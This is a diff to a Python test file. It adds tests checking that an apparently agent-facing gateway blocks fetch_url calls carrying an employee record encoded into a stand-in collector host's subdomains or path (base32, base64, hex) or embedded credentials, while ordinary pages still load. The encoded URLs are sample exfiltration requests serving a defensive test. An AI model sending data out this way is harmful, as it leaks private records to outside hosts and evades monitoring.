@@ -90,3 +90,27 @@ def test_unknown_policy_condition_fails_loudly(tmp_path):
     )
     with pytest.raises(ValueError, match="unknown condition"):
         PolicyEngine(policy_path=bad)
+
+
+ROW = "EMP-001,Tendai Moyo,CEO,$12500,CBZ-991244"
+
+
+@pytest.mark.parametrize("url", [
+    "https://ivgvaljqgaysyvdfnzsgc2jajvxxs3zmincu6lbe.gezdkmbqfrbuewrnhe4tcmrugq.collector.example/",  # base32 in subdomains
+    "https://collector.example/RU1QLTAwMSxUZW5kYWkgTW95byxDRU8sJDEyNTAwLENCWi05OTEyNDQ",  # base64 in path
+    "https://collector.example/a/454d502d3030312c54656e646169204d6f796f2c43454f2c2431323530302c/x.png",  # hex in path
+    "https://user:pw@collector.example/",  # credentials in the address
+])
+def test_encoded_payload_in_host_or_path_of_unknown_site_is_blocked(url):
+    _, gw = protected_gateway()
+    assert gw.execute("fetch_url", {"url": url}).decision == "block"
+
+
+@pytest.mark.parametrize("url", [
+    "https://docs.python.org/3/library/os.html",
+    "https://collector.example/about",
+    "https://collector.example/",
+])
+def test_ordinary_unknown_pages_still_load(url):
+    _, gw = protected_gateway()
+    assert gw.execute("fetch_url", {"url": url}).decision == "allow"
